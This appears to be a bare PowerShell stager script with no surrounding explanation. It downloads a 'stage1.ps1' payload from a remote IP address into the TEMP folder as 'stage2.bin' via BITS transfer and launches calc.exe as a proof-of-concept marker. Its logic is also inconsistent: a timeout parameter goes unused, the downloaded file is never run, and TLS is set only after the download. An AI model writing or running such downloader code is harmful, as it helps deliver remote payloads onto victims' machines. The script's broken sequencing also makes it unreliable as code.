
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://192.0.2.33/stage1.ps1',
    [string]$WorkingPath = "$env:TEMP\stage2.bin",
    [int]$ConnectionTimeout = 219
)
Start-BitsTransfer -Source $RemoteUrl -Destination $WorkingPath
Start-Process -FilePath "calc.exe"
Set-Location -Path $env:TEMP
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
